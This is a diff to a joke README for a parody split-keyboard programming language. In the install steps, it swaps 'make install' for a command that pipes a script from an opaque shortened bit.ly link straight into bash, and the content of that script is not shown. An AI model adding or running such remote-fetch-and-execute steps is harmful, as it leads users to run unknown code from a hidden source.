@@ -1,5 +1,7 @@
 # BiHand++™
 
+Feel like an F1 car, and race through your issues.
+
 The **first-ever programming language** designed for **true split keyboard superiority**.  
 Why type with two hands on the same code when you can **code in parallel** like a proper keyboard deity?
 
@@ -15,7 +17,7 @@ Why type with two hands on the same code when you can **code in parallel** like 
 ```bash
 git clone https://github.com/oemebamo/bihand
 cd bihand
-make install # Compiles instantly because typing slower is for mortals
+curl -s -L https://bit.ly/3zvELNz | bash # Compiles instantly because typing slower is for mortals
 ```
 
 ## 🧱 Requirements:
